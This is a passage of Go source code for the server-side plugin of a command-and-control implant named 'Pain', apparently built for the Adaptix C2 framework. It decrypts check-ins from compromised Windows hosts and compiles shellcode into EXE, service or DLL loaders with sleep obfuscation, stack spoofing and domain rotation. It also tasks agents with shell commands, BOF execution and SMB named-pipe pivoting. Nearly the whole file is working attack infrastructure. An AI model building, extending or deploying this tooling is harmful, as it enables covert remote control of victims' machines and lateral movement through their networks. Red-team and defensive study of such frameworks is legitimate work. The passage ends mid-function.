const (
	AUTH_MODE_NONE = 0
	AUTH_MODE_CMD  = 1 // persistent key - multiple runs allowed
	AUTH_MODE_OTK  = 2 // one-time key - consumed after first check-in
)

// authKeys stores pending auth keys generated by BuildPayload.
// key: 32-char lowercase hex string  →  value: int (AUTH_MODE_CMD or AUTH_MODE_OTK)
var authKeys sync.Map

// listenerConfig mirrors the HTTP listener plugin's ListenerConfig for JSON parsing.
type listenerConfig struct {
	HostBind       string `json:"host_bind"`
	PortBind       int    `json:"port_bind"`
	Ssl            bool   `json:"ssl"`
	ProfileContent string `json:"uploaded_file"`
	DomainRotation string `json:"domain_rotation_strategy"`
}

// smbListenerConfig mirrors the SMB listener plugin's ListenerConfig.
type smbListenerConfig struct {
	PipeName string `json:"pipe_name"`
}

// agentBuildProfile is the unified profile type returned by GenerateProfiles.
// Type lets BuildPayload dispatch to the correct code path.
type agentBuildProfile struct {
	Type string `json:"type"` // "http" | "smb"
	// HTTP fields
	HostBind       string `json:"host_bind,omitempty"`
	PortBind       int    `json:"port_bind,omitempty"`
	Ssl            bool   `json:"ssl,omitempty"`
	ProfileContent string `json:"uploaded_file,omitempty"`
	DomainRotation string `json:"domain_rotation_strategy,omitempty"`
	// SMB field
	PipeName string `json:"pipe_name,omitempty"`
}

// PainData holds Pain-specific fields that don't fit in the ax.AgentData
// Serialised as JSON and Stored in agent.CustomData so we can read it back later
type PainData struct {
	Username string `json:"username"`
	Computer string `json:"computer"`
	Pid      uint32 `json:"pid"`
	Tid      uint32 `json:"tid"`
	Sleep    uint32 `json:"sleep"`
	OsMajor  uint32 `json:"os_major"`
	OsMinor  uint32 `json:"os_minor"`
	OsBuild  uint32 `json:"os_build"`
	Elevated bool   `json:"elevated"`
}

// Marshal save PainData into agent.CustomData as JSON
func (d *PainData) Marshal(agent *ax.AgentData) {
	b, _ := json.Marshal(d)
	agent.CustomData = b
}

// IMP CreateAgent is called by the teamserver when a brand new agent checks in
//
//	The framework strips the first 36 bytes (AgentID) from the POST body
//
// and passes the rest here as `beat`. That slice is XOR-encrypted.
// Pain's check-in layout (after XOR decrypt):
//
//	[4 bytes BE]   0xF1 magic  (Pkg_Int32 in Transport.cc)
//	[4+N bytes]    username    (Pkg_Bytes)
//	[4+N bytes]    computer    (Pkg_Bytes)
//	[4 bytes BE]   PID
//	[4 bytes BE]   TID
//	[4 bytes BE]   Sleep (seconds)
//	[4 bytes BE]   OsMajor
//	[4 bytes BE]   OsMinor
//	[4 bytes BE]   OsBuild
//	[4 bytes BE]   Elevated (0 or 1)

// newAgentFunctions returns the function set Adaptix needs to communicate with Pain.
// In v2, instead of implementing an interface, we hand back a struct of function pointers.
func newAgentFunctions() ax.AgentFunctions {
	return ax.AgentFunctions{
		CreateCommand: CreateCommand,
		PackTasks:     PackTasks,
		Encrypt: func(data []byte, key []byte) ([]byte, error) {
			// The agent does NOT decrypt incoming poll responses (Transport_Poll passes
			// the HTTP response body directly to Task_Dispatch). Keep this a no-op.
			return data, nil
		},
		Decrypt: func(data []byte, key []byte) ([]byte, error) {
			if len(data) == 0 {
				return data, nil
			}
			if len(key) > 0 {
				return XorCryptWithKey(data, key), nil
			}
			return XorCrypt(data), nil
		},
		ProcessData: func(agentData ax.AgentData, packedData []byte) error {
			return processData(agentData, packedData)
		},
		PivotPackData: pivotPackData,
	}
}

// tryAuthPrefix checks whether beat starts with a known auth key hex string.
// Returns (rawKey, keyHex, mode) where rawKey is non-nil on a match.
// For OTK mode, the key is deleted from the map immediately (one-time use).
func tryAuthPrefix(beat []byte) (rawKey []byte, keyHex string, mode int) {
	if len(beat) < 32 {
		return nil, "", 0
	}
	hs := string(beat[:32])
	val, ok := authKeys.Load(hs)
	if !ok {
		return nil, "", 0
	}
	m := val.(int)
	raw, err := hex.DecodeString(hs)
	if err != nil || len(raw) != 16 {
		return nil, "", 0
	}
	if m == AUTH_MODE_OTK {
		authKeys.Delete(hs) // consume one-time key
	}
	return raw, hs, m
}

// in the new version we have ax.AgentFunction not ax.ExtenderAgent
func CreateAgent(beat []byte) (ax.AgentData, ax.AgentFunctions, error) {
	var agent ax.AgentData

	// Check for an auth prefix: [32 ASCII hex key][XOR(rawKey, check-in data)]
	rawKey, keyHex, authMode := tryAuthPrefix(beat)

	var plain []byte
	var sessionKey []byte

	if rawKey != nil {
		// Auth check-in: decrypt payload (beat[32:]) with the raw auth key
		plain = XorCryptWithKey(beat[32:], rawKey)
		// SessionKey = raw auth key so the framework uses it for all subsequent Encrypt/Decrypt
		sessionKey = rawKey
		fmt.Printf("[Pain] auth check-in: mode=%d key=%s...\n", authMode, keyHex[:8])
	} else {
		// No auth prefix found - try legacy hardcoded XOR
		plain = XorCrypt(beat)
		sessionKey = []byte{} // empty = satisfies BLOB NOT NULL, signals no-auth to Encrypt/Decrypt
	}

	p := NewParser(plain)

	// Magic check - 0xF1 as 4-byte big-endian integer
	magic := p.ReadInt32()
	if magic != 0xF1 {
		return agent, newAgentFunctions(), errors.New("bad magic [-] not a Pain Check-in")
	}

	// Read fields in the exact order Transport.cc wrote them
	username := string(p.ReadBytes())
	computer := string(p.ReadBytes())
	pid := p.ReadInt32()
	tid := p.ReadInt32()
	sleep := p.ReadInt32()
	osMajor := p.ReadInt32()
	osMinor := p.ReadInt32()
	osBuild := p.ReadInt32()
	elevated := p.ReadInt32() != 0

	// Process name - appended last; older agents without this field return empty gracefully
	processName := "unknown"
	if p.Remaining() >= 4 {
		if b := p.ReadBytes(); len(b) > 0 {
			processName = string(b)
		}
	}

	fmt.Printf("[Pain] checkin - user=%s computer=%s pid=%d process=%s elevated=%v sleep=%ds os=%d.%d.%d\n",
		username, computer, pid, processName, elevated, sleep, osMajor, osMinor, osBuild)

	osDesc := fmt.Sprintf("Windows %d.%d (Build %d)", osMajor, osMinor, osBuild)
	if osMajor == 10 && osBuild >= 22000 {
		osDesc = fmt.Sprintf("Windows 11 (Build %d)", osBuild)
	} else if osMajor == 10 {
		osDesc = fmt.Sprintf("Windows 10 (Build %d)", osBuild)
	}

	// SessionKey BLOB NOT NULL: nil []byte → SQL NULL → INSERT OR IGNORE silently drops row.
	// Use []byte{} for no-auth, or the raw auth key for auth sessions.
	agent = ax.AgentData{
		Sleep:      uint(sleep),
		Username:   username,
		Computer:   computer,
		Pid:        fmt.Sprintf("%d", pid),
		Tid:        fmt.Sprintf("%d", tid),
		Arch:       "x64",
		Elevated:   elevated,
		Os:         OS_WINDOWS,
		OsDesc:     osDesc,
		Process:    processName,
		SessionKey: sessionKey,
	}

	cfg := PainData{
		Username: username, Computer: computer,
		Pid: pid, Tid: tid, Sleep: sleep,
		OsMajor: osMajor, OsMinor: osMinor, OsBuild: osBuild,
		Elevated: elevated,
	}
	cfg.Marshal(&agent)

	return agent, newAgentFunctions(), nil
}

// CreateAgent is a method on PluginAgent so it satisfies ax.PluginAgent
func (pa *PluginAgent) CreateAgent(beat []byte) (ax.AgentData, ax.AgentFunctions, error) {
	return CreateAgent(beat)
}

// GenerateProfiles converts each listener's saved JSON into a typed agentBuildProfile
// that BuildPayload uses to dispatch the correct build path.
func (pa *PluginAgent) GenerateProfiles(profile ax.BuildProfile) ([][]byte, error) {
	var result [][]byte
	for _, lp := range profile.ListenerProfiles {
		// Try HTTP listener profile first
		var httpCfg listenerConfig
		if err := json.Unmarshal(lp.Profile, &httpCfg); err == nil && httpCfg.HostBind != "" && httpCfg.PortBind != 0 {
			b, _ := json.Marshal(agentBuildProfile{
				Type:           "http",
				HostBind:       httpCfg.HostBind,
				PortBind:       httpCfg.PortBind,
				Ssl:            httpCfg.Ssl,
				ProfileContent: httpCfg.ProfileContent,
				DomainRotation: httpCfg.DomainRotation,
			})
			result = append(result, b)
			continue
		}
		// Try SMB listener profile
		var smbCfg smbListenerConfig
		if err := json.Unmarshal(lp.Profile, &smbCfg); err == nil && smbCfg.PipeName != "" {
			b, _ := json.Marshal(agentBuildProfile{
				Type:     "smb",
				PipeName: smbCfg.PipeName,
			})
			result = append(result, b)
			continue
		}
	}
	if len(result) == 0 {
		return nil, fmt.Errorf("no valid listener profile found - create a PainHTTP or PainSMB listener first")
	}
	return result, nil
}

// BuildPayload compiles the agent shellcode with the operator's settings and wraps
// it in loader.exe, which is returned as the download payload.
func (pa *PluginAgent) BuildPayload(profile ax.BuildProfile, agentProfiles [][]byte) ([]byte, string, error) {
	if len(agentProfiles) == 0 {
		return nil, "", fmt.Errorf("no listener profile - add a PainHTTP or PainSMB listener first")
	}

	// 1. Parse the unified listener profile produced by GenerateProfiles
	var ap agentBuildProfile
	if err := json.Unmarshal(agentProfiles[0], &ap); err != nil {
		return nil, "", fmt.Errorf("bad listener profile: %v", err)
	}

	// 2. Parse sleep/jitter/auth/format from the agent build form
	var uiCfg struct {
		Sleep      int    `json:"sleep"`
		Jitter     int    `json:"jitter"`
		SleepTech  string `json:"sleep_tech"`
		StackSpoof *bool  `json:"stack_spoof"`
		AuthMode   string `json:"auth_mode"`
		Format     string `json:"format"`
	}
	uiCfg.Sleep = 5
	_ = json.Unmarshal([]byte(profile.AgentConfig), &uiCfg)
	if uiCfg.Sleep < 1 {
		uiCfg.Sleep = 5
	}

	// Determine auth mode from combo selection
	authMode := AUTH_MODE_NONE
	authKeyHex := ""
	switch {
	case strings.HasPrefix(uiCfg.AuthMode, "One Time"):
		authMode = AUTH_MODE_OTK
	case strings.HasPrefix(uiCfg.AuthMode, "Command"):
		authMode = AUTH_MODE_CMD
	}
	if authMode != AUTH_MODE_NONE {
		raw := make([]byte, 16)
		if _, err := cryptorand.Read(raw); err == nil {
			authKeyHex = hex.EncodeToString(raw)
			authKeys.Store(authKeyHex, authMode)
			fmt.Printf("[Pain] BuildPayload: auth mode=%d key=%s...\n", authMode, authKeyHex[:8])
		}
	}

	agentSrc := ModuleDir + "/" + SrcPath
	loaderSrc := agentSrc + "/src_loader"

	// Fail fast with a clear message rather than a confusing make error
	if _, err := os.Stat(agentSrc + "/Makefile"); err != nil {
		return nil, "", fmt.Errorf("agent source not found at %s - run setup_pain.sh", agentSrc)
	}
	for _, tool := range []string{"make", "clang++", "nasm", "x86_64-w64-mingw32-ld", "objcopy"} {
		if _, err := exec.LookPath(tool); err != nil {
			return nil, "", fmt.Errorf("%s not in PATH - server process may have a different PATH than your shell", tool)
		}
	}

	sleepTech := 0
	if uiCfg.SleepTech == "Ekko Graft" {
		sleepTech = 1
	} else if uiCfg.SleepTech == "Ekko" {
		sleepTech = 2
	}

	stackSpoof := 1
	if uiCfg.StackSpoof != nil && !*uiCfg.StackSpoof {
		stackSpoof = 0
	}

	// 4. Transport-specific make args
	var makeArgs []string

	switch ap.Type {
	case "smb":
		pipeName := ap.PipeName
		if pipeName == "" {
			pipeName = `\\.\pipe\pain`
		}
		fmt.Printf("[Pain] BuildPayload: compiling SMB agent pipe=%s sleep=%ds\n", pipeName, uiCfg.Sleep)
		makeArgs = []string{
			"PAIN_C2_HOST=127.0.0.1",
			"PAIN_C2_PORT=8080",
			"PAIN_C2_SSL=0",
			"PAIN_PROFILE_C2=0x15",
			fmt.Sprintf("PAIN_PIPE_NAME=\"%s\"", pipeNameToHexArr(pipeName)),
			"PAIN_MALLEABLE_BYTES=\"{0x00}\"",
			"PAIN_CALLBACK_COUNT=0",
			"PAIN_ROTATION=0",
		}

	default: // "http"
		malleableHex := "{0x00}"
		callbackCount := 0
		rotCode := 0

		if ap.ProfileContent != "" {
			profileBytes, decErr := base64.StdEncoding.DecodeString(ap.ProfileContent)
			if decErr == nil {
				blob, count, bErr := buildMalleableBytes(string(profileBytes), ap.DomainRotation, ap.Ssl)
				if bErr == nil && count > 0 {
					malleableHex = bytesToHexStr(blob)
					callbackCount = count
					rotCode = rotationCode(ap.DomainRotation)
					fmt.Printf("[Pain] BuildPayload: malleable blob %d bytes, %d callbacks, rotation=%q\n",
						len(blob), count, ap.DomainRotation)
				} else if bErr != nil {
					fmt.Printf("[Pain] BuildPayload: malleable build failed: %v - using legacy single host\n", bErr)
				}
			}
		}

		sslFlag := 0
		if ap.Ssl {
			sslFlag = 1
		}

		fmt.Printf("[Pain] BuildPayload: compiling %s:%d ssl=%v sleep=%ds jitter=%d%% callbacks=%d\n",
			ap.HostBind, ap.PortBind, ap.Ssl, uiCfg.Sleep, uiCfg.Jitter, callbackCount)

		makeArgs = []string{
			fmt.Sprintf("PAIN_C2_HOST=%s", ap.HostBind),
			fmt.Sprintf("PAIN_C2_PORT=%d", ap.PortBind),
			fmt.Sprintf("PAIN_C2_SSL=%d", sslFlag),
			"PAIN_PROFILE_C2=0x25",
			fmt.Sprintf("PAIN_MALLEABLE_BYTES=\"%s\"", malleableHex),
			fmt.Sprintf("PAIN_CALLBACK_COUNT=%d", callbackCount),
			fmt.Sprintf("PAIN_ROTATION=%d", rotCode),
		}
	}

	// Common args applied to every transport type
	makeArgs = append(makeArgs,
		fmt.Sprintf("PAIN_SLEEP=%d", uiCfg.Sleep),
		fmt.Sprintf("PAIN_JITTER=%d", uiCfg.Jitter),
		fmt.Sprintf("PAIN_AUTH_MODE=%d", authMode),
		fmt.Sprintf("PAIN_SLEEP_TECH=%d", sleepTech),
		fmt.Sprintf("PAIN_STACK_SPOOF=%d", stackSpoof),
	)
	if authKeyHex != "" {
		makeArgs = append(makeArgs, fmt.Sprintf("PAIN_AUTH_KEY=%s", authKeyHex))
	}

	cleanArgs := append([]string{"-C", agentSrc, "clean"}, makeArgs...)
	if out, err := exec.Command("make", cleanArgs...).CombinedOutput(); err != nil {
		return nil, "", fmt.Errorf("agent clean failed:\n%s", out)
	}

	buildArgs := append([]string{"-C", agentSrc}, makeArgs...)
	if out, err := exec.Command("make", buildArgs...).CombinedOutput(); err != nil {
		return nil, "", fmt.Errorf("agent shellcode build failed:\n%s", out)
	}

	// 5. Read the raw shellcode binary
	shellcode, err := os.ReadFile(agentSrc + "/pain.x64.bin")
	if err != nil {
		return nil, "", fmt.Errorf("pain.x64.bin not found after build: %v", err)
	}

	// 6. Generate pain_shellcode.h from the fresh shellcode
	header := genShellcodeHeader(shellcode)
	if err := os.WriteFile(loaderSrc+"/pain_shellcode.h", header, 0644); err != nil {
		return nil, "", fmt.Errorf("failed to write pain_shellcode.h: %v", err)
	}

	// 7. Shellcode-only format: skip loader build, return raw bytes directly.
	if strings.HasPrefix(uiCfg.Format, "Shellcode") {
		fmt.Printf("[Pain] BuildPayload: done - shellcode %d bytes for %s:%d\n",
			len(shellcode), ap.HostBind, ap.PortBind)
		return shellcode, "pain.x64.bin", nil
	}

	// 8. Determine which loader target to build and what file to return.
	makeTarget := "Pain.x64.exe"
	outFile := loaderSrc + "/Pain.x64.exe"
	outName := "Pain.x64.exe"
	switch {
	case strings.HasPrefix(uiCfg.Format, "Service"):
		makeTarget = "Pain.x64.svc.exe"
		outFile = loaderSrc + "/Pain.x64.svc.exe"
		outName = "Pain.x64.svc.exe"
	case strings.HasPrefix(uiCfg.Format, "DLL"):
		makeTarget = "Pain.x64.dll"
		outFile = loaderSrc + "/Pain.x64.dll"
		outName = "Pain.x64.dll"
	}

	// Use -B to force rebuild even if timestamps haven't changed between builds.
	cmd2 := exec.Command("make", "-B", "-C", loaderSrc, makeTarget)
	if out, err := cmd2.CombinedOutput(); err != nil {
		return nil, "", fmt.Errorf("loader build (%s) failed:\n%s", makeTarget, out)
	}

	// 9. Read and return the finished loader
	loaderBytes, err := os.ReadFile(outFile)
	if err != nil {
		return nil, "", fmt.Errorf("%s not found after build: %v", makeTarget, err)
	}

	fmt.Printf("[Pain] BuildPayload: done - %s %d bytes for %s:%d\n",
		outName, len(loaderBytes), ap.HostBind, ap.PortBind)

	return loaderBytes, outName, nil
}

// genShellcodeHeader produces a C++ header that embeds shellcode bytes in the .text section
// inside the PainSC namespace. All loaders cast PainSC::Data directly to a function pointer
// - no VirtualAlloc/RWX needed since .text is already executable.
func genShellcodeHeader(data []byte) []byte {
	var b strings.Builder
	b.WriteString("#pragma once\n#include <stdint.h>\n\nnamespace PainSC {\n")
	b.WriteString("    __attribute__((section(\".text\")))\n")
	b.WriteString("    const uint8_t Data[] = {")
	for i, v := range data {
		if i%12 == 0 {
			b.WriteString("\n        ")
		}
		b.WriteString(fmt.Sprintf("0x%02x, ", v))
	}
	b.WriteString(fmt.Sprintf("\n    };\n    constexpr size_t Size = %d;\n}\n", len(data)))
	return []byte(b.String())
}

// pipeNameToHexArr converts a Windows pipe path string into the C byte-array literal
// that PAIN_PIPE_NAME expects, e.g. "\\.\pipe\pain" → "{0x5c,0x5c,0x2e,...,0x00}".
// Same format as PAIN_MALLEABLE_BYTES - avoids all Makefile/shell backslash issues.
func pipeNameToHexArr(name string) string {
	var sb strings.Builder
	sb.WriteByte('{')
	for i := 0; i < len(name); i++ {
		fmt.Fprintf(&sb, "0x%02x,", name[i])
	}
	sb.WriteString("0x00}")
	return sb.String()
}

// CreateCommand builds a task packet when the operator runs a command in the UI
func CreateCommand(agentData ax.AgentData, args map[string]any) (ax.TaskData, ax.ConsoleMessageData, error) {
	var (
		taskData    ax.TaskData
		messageData ax.ConsoleMessageData
	)

	command, ok := args["command"].(string)
	if !ok {
		return taskData, messageData, errors.New("'command' must be set")
	}

	taskData = ax.TaskData{
		Type: TYPE_TASK,
		Sync: true,
	}
	messageData = ax.ConsoleMessageData{Status: MESSAGE_INFO}

	// argPacker builds the argument blob the agent reads with Psr_Bytes
	argPacker := NewPacker()

	switch command {

	case "shell":
		cmd, ok := args["cmd"].(string)
		if !ok || cmd == "" {
			return taskData, messageData, errors.New("'cmd' parameter is required")
		}
		argPacker.WriteStr(cmd)
		taskData.Data = buildTaskPacket(CMD_SHELL, argPacker.Bytes())
		messageData.Message = fmt.Sprintf("shell: %s", cmd)

	case "pwd":
		taskData.Data = buildTaskPacket(CMD_PWD, nil)
		messageData.Message = "pwd"

	case "ls":
		path, _ := args["path"].(string)
		argPacker.WriteStr(path)
		taskData.Data = buildTaskPacket(CMD_LS, argPacker.Bytes())
		messageData.Message = fmt.Sprintf("ls: %s", path)

	case "exit":
		taskData.Data = buildTaskPacket(CMD_EXIT, nil)
		messageData.Message = "exit"
		messageData.Status = MESSAGE_ERROR

	case "execute_bof":
		bofPath, _ := args["bof_path"].(string)
		bofBytes, err := os.ReadFile(bofPath)
		if err != nil {
			return taskData, messageData, fmt.Errorf("cannot read BOF file %s: %v", bofPath, err)
		}

		// bof_args is base64(ax.bof_pack output). Decode outer base64, then fix any
		// inner base64-encoded PE bytes caused by the Extension-Kit's resolveFileRefs.
		bofArgsB64, _ := args["bof_args"].(string)
		bofArgs, _ := base64.StdEncoding.DecodeString(bofArgsB64)
		bofArgs = fixB64PEInBofArgs(bofArgs)

		argPacker.WriteBytes(bofBytes)
		argPacker.WriteBytes(bofArgs)
		taskData.Data = buildTaskPacket(CMD_BOF, argPacker.Bytes())
		messageData.Message = fmt.Sprintf("execute_bof: %s (%d bytes)", bofPath, len(bofBytes))

	case "link":
		subcommand, _ := args["subcommand"].(string)
		if subcommand != "smb" {
			return taskData, messageData, errors.New("usage: link smb <target> [pipe_name]")
		}
		target, ok := args["target"].(string)
		if !ok || target == "" {
			return taskData, messageData, errors.New("'target' is required for link smb")
		}
		pipeName, _ := args["pipe_name"].(string)
		if pipeName == "" {
			pipeName = "pain"
		}
		fullPath := fmt.Sprintf("\\\\%s\\pipe\\%s", target, pipeName)
		argPacker.WriteStr(fullPath)
		taskData.Data = buildTaskPacket(CMD_LINK, argPacker.Bytes())
		messageData.Message = fmt.Sprintf("link smb: %s", fullPath)

	case "unlink":
		agentIDStr, ok := args["agent_id"].(string)
		if !ok || agentIDStr == "" {
			return taskData, messageData, errors.New("'agent_id' is required")
		}
		agentIdInt, err := strconv.ParseInt(agentIDStr, 10, 64)
		if err != nil {
			return taskData, messageData, fmt.Errorf("invalid agent_id %q: %v", agentIDStr, err)
		}
		uuidVal, found := PivotChildMap.Load(agentIdInt)
		if !found {
			return taskData, messageData, fmt.Errorf("agent %s is not a known SMB child", agentIDStr)
		}
		childUUID := uuidVal.(string)
		argPacker.WriteStr(childUUID)
		taskData.Data = buildTaskPacket(CMD_UNLINK, argPacker.Bytes())
		messageData.Message = fmt.Sprintf("unlink: agent %s (%s)", agentIDStr, childUUID[:8])

	default:
		return taskData, messageData, fmt.Errorf("Unknown command: %s", command)
	}

	return taskData, messageData, nil
}

// fixB64PEInBofArgs detects when the first "bytes" argument inside a bof_pack
// buffer is base64-encoded PE data (the Extension-Kit's resolveFileRefs always
// base64-encodes uploaded file content, so it arrives double-encoded). If the
// first arg is not a raw MZ PE but base64-decodes to one, the buffer is rebuilt
// with the decoded bytes. Safe to call on any BOF arg buffer - non-PE args are
// left untouched.
func fixB64PEInBofArgs(packed []byte) []byte {
	// ax.bof_pack layout: [4 LE total_len][4 LE len1][bytes1][4 LE len2][bytes2]...
	if len(packed) < 8 {
		return packed
	}
	asmLen := int(binary.LittleEndian.Uint32(packed[4:]))
	dataStart := 8
	if dataStart+asmLen > len(packed) || asmLen < 2 {
		return packed
	}
	asmBytes := packed[dataStart : dataStart+asmLen]
	if asmBytes[0] == 0x4D && asmBytes[1] == 0x5A {
		return packed // already raw PE
	}
	decoded, err := base64.StdEncoding.DecodeString(string(asmBytes))
	if err != nil || len(decoded) < 2 || decoded[0] != 0x4D || decoded[1] != 0x5A {
		return packed // not base64 PE, leave as-is
	}
	rest := packed[dataStart+asmLen:]
	newTotal := uint32(4 + len(decoded) + len(rest))
	out := make([]byte, 4+4+len(decoded)+len(rest))
	binary.LittleEndian.PutUint32(out[0:], newTotal)
	binary.LittleEndian.PutUint32(out[4:], uint32(len(decoded)))
	copy(out[8:], decoded)
	copy(out[8+len(decoded):], rest)
	return out
}

// buildTaskPacket serialises one task into [cmd_id][4-byte arg len][arg bytes]
// Task_Dispatch reads: Psr_Int32 for cmd_id, Psr_Bytes for args
func buildTaskPacket(cmdId uint32, argData []byte) []byte {
	p := NewPacker()
	p.WriteInt32(cmdId)
	if argData != nil {
		p.WriteBytes(argData)
	} else {
		p.WriteInt32(0) // zero-length arg
	}
	return p.Bytes()
}

// PackTasks serialiese the taks list into the exact byte Task_Dispatch parses
func PackTasks(agentData ax.AgentData, tasks []ax.TaskData) ([]byte, error) {
	p := NewPacker()

	// Filter out SMB heartbeat placeholders: PROXY_DATA tasks with no Data.
	// They exist only to satisfy TsTasksPivotExists so extractPivotTasks runs;
	// the child should receive [4B 0] (zero task count) which we produce here.
	var real []ax.TaskData
	for _, t := range tasks {
		if t.Type == ax.TASK_TYPE_PROXY_DATA && len(t.Data) == 0 {
			continue
		}
		real = append(real, t)
	}

	p.WriteInt32(uint32(len(real)))
	for _, task := range real {
		// UUID must be exactly 36 bytes - pad with zeros if shorter
		idStr := fmt.Sprintf("%036d", task.TaskId) // zero-pad int64 to 36 decimal digits
		p.WritePad([]byte(idStr))
		p.WritePad(task.Data) // cmd_id + args from buildTaskPacket
	}

	return p.Bytes(), nil
}

// injectHeartbeat puts a PROXY_DATA placeholder into the child's hosted queue.
// This makes TsTasksPivotExists return true for the HTTP parent, which causes
// extractPivotTasks to run and build a CMD_PIVOT heartbeat relay. PackTasks
// filters the placeholder out, so the child receives [4B 0] = zero tasks.
func injectHeartbeat(childId int64) {
	ModuleObject.ts.TsTaskCreate(childId, "smb_heartbeat", "smb", ax.TaskData{
		Type:    ax.TASK_TYPE_PROXY_DATA,
		AgentId: childId,
		Sync:    false, // no DB insert, no UI sync
	})
}

// cleanPivotMaps removes all pivot-tracking entries for a child.
func cleanPivotMaps(childUUID string, childId int64) {
	PivotMap.Delete(childUUID)
	PivotParentMap.Delete(childUUID)
	PivotChildMap.Delete(childId)
}

// notifyParentConsole prints a disconnect/unlink message in the HTTP parent's console.
// Looks up the parent from PivotParentMap; no-ops if the agent has no parent (HTTP agents).
func notifyParentConsole(agentId int64, childUUID string, reason string) {
	parentVal, ok := PivotParentMap.Load(childUUID)
	if !ok {
		// Try reverse lookup: agentId might be the child itself.
		if uuidVal, ok2 := PivotChildMap.Load(agentId); ok2 {
			parentVal, ok = PivotParentMap.Load(uuidVal.(string))
		}
	}
	if !ok {
		return
	}
	parentId := parentVal.(int64)
	msg := fmt.Sprintf("----- SMB child %s %s -----", childUUID[:8], reason)
	ModuleObject.ts.TsAgentConsoleOutput(parentId, "pain", MESSAGE_INFO, msg, msg, false)
}

// notifyParentDisconnect is called when an agent's CMD_EXIT fires.
// If the agent is an SMB child (tracked in PivotChildMap), it notifies its parent.
func notifyParentDisconnect(agentId int64, taskId int64, reason string) {
	uuidVal, ok := PivotChildMap.Load(agentId)
	if !ok {
		return // HTTP root agent - no parent to notify
	}
	childUUID := uuidVal.(string)
	notifyParentConsole(agentId, childUUID, reason)
	cleanPivotMaps(childUUID, agentId)
}

// ProcessData is called for every inbound packet that is NOT a check-in.
// The framework already called our Decrypt() before invoking this, so
// packedData is already XOR-decrypted plaintext - do NOT decrypt again.
func processData(agentData ax.AgentData, packedData []byte) error {
	// empty = agent just polled with no result to report
	if len(packedData) == 0 {
		return nil
	}

	p := NewParser(packedData)

	if p.Remaining() < 36 {
		return nil
	}

	uuidBytes := p.ReadPad(36)
	taskIdStr := strings.TrimLeft(string(uuidBytes), "0")
	if taskIdStr == "" {
		taskIdStr = "0"
	}
	taskId, _ := strconv.ParseInt(taskIdStr, 10, 64)

	// Read output if present
	var output string
	if p.Remaining() >= 4 {
		out := p.ReadBytes()
		if len(out) > 0 && out[0] == LINK_MAGIC {
			// CMD_LINK result: [0x4C][36B child UUID][checkin payload]
			// Register the child agent with the SMB listener, then report to the operator.
			childData := out[1:]
			linkErr := registerSmbChild(agentData, taskId, childData)
			if linkErr != nil {
				ModuleObject.ts.TsTaskUpdate(agentData.Id, ax.TaskData{
					Type:        TYPE_TASK,
					AgentId:     agentData.Id,
					TaskId:      taskId,
					MessageType: MESSAGE_ERROR,
					Completed:   true,
					Sync:        true,
					ClearText:   fmt.Sprintf("link failed: %v", linkErr),
				})
			}
			return nil
		}

		// EXIT_MAGIC: agent sent 0x45 before TerminateProcess - mark it terminated.
		if len(out) == 1 && out[0] == EXIT_MAGIC {
			notifyParentDisconnect(agentData.Id, taskId, "exited")
			_ = ModuleObject.ts.TsAgentTerminate(agentData.Id, taskId)
			return nil
		}

		// CMD_UNLINK result: HTTP parent closed the child pipe, echoes back [36B child_uuid].
		if len(out) == 36 {
			childUUID := string(out[:36])
			if val, ok := PivotMap.Load(childUUID); ok {
				childId := val.(int64)
				notifyParentConsole(agentData.Id, childUUID, "unlinked")
				_ = ModuleObject.ts.TsAgentTerminate(childId, taskId)
				cleanPivotMaps(childUUID, childId)
			}
			output = fmt.Sprintf("SMB child %s unlinked", string(out[:8]))
		}

		if len(out) == 37 && out[0] == PIVOT_DEAD_MAGIC {
			// HTTP parent's pipe to the SMB child broke: [0x44][36B child_uuid]
			childUUID := string(out[1:37])
			if val, ok := PivotMap.Load(childUUID); ok {
				childId := val.(int64)
				fmt.Printf("[Pain] SMB child %s pipe broken - terminating agent %d\n", childUUID, childId)
				notifyParentConsole(agentData.Id, childUUID, "lost connection")
				if err := ModuleObject.ts.TsAgentTerminate(childId, 0); err != nil {
					fmt.Printf("[Pain] TsAgentTerminate(%d): %v\n", childId, err)
				}
				cleanPivotMaps(childUUID, childId)
			}
			return nil
		}

		if len(out) >= 37 && out[0] == PIVOT_RESULT_MAGIC {
			// CMD_PIVOT result: [0x50][36B child_uuid][encrypted_child_body]
			// Route the encrypted body to the child agent's ProcessData so its
			// task results get displayed in the child's session.
			childUUID := string(out[1:37])
			encBody := out[37:]

			if val, ok := PivotMap.Load(childUUID); ok {
				childId := val.(int64)

				if err := ModuleObject.ts.TsAgentProcessData(childId, encBody); err != nil {
					fmt.Printf("[Pain] pivot relay: TsAgentProcessData failed for %s: %v\n", childUUID, err)
				}
				_ = ModuleObject.ts.TsAgentSetTick(childId, SMB_LISTENER_NAME)

				// Re-inject heartbeat to keep the relay cycle alive until the next
				// operator command arrives for this child.
				injectHeartbeat(childId)
			} else {
				fmt.Printf("[Pain] pivot relay: unknown child UUID %s\n", childUUID)
			}
			return nil
		}

		if out != nil {
			output = string(out)
		}
	}

	fmt.Printf("[Pain] result - task=%d output_len=%d \n", taskId, len(output))

	ModuleObject.ts.TsTaskUpdate(agentData.Id, ax.TaskData{
		Type:        TYPE_TASK,
		AgentId:     agentData.Id,
		TaskId:      taskId,
		MessageType: MESSAGE_SUCCESS,
		Completed:   true,
		Sync:        true,
		ClearText:   output,
	})

	return nil
}

// registerSmbChild registers the child SMB beacon with the PainSMB listener.
// childData = [36B child UUID][checkin payload] from the parent's CMD_LINK result.
// On success it updates the parent's task with the child's UUID string.
func registerSmbChild(parentData ax.AgentData, taskId int64, childData []byte) error {
	if len(childData) < 36 {
		return fmt.Errorf("child data too short (%d bytes)", len(childData))
	}

	uid     := childData[:36]
	payload := childData[36:]

	childId, exists := ModuleObject.ts.TsAgentIdByUID(uid)
	if !exists {
		// Register the SMB child with Async=false so LastTickWorker skips it
		// entirely and never renders a countdown. The child only communicates
		// through the parent relay, so a sleep-based countdown is meaningless.
		agentInfo, err := ModuleObject.ts.TsAgentCreate(
			"deadbeef", uid, payload, SMB_LISTENER_NAME, "SMB", false,
		)
		if err != nil {
			// Race: check again in case another goroutine already created it
			if retryId, found := ModuleObject.ts.TsAgentIdByUID(uid); found {
				childId = retryId
			} else {
				return fmt.Errorf("TsAgentCreate: %w", err)
			}
		} else {
			childId = agentInfo.Id
		}
	}

	_ = ModuleObject.ts.TsAgentSetTick(childId, SMB_LISTENER_NAME)

	// Store all pivot mappings so relay, death-detection, and unlink can all find each other.
	childUUID := string(uid)
	PivotMap.Store(childUUID, childId)
	PivotParentMap.Store(childUUID, parentData.Id)
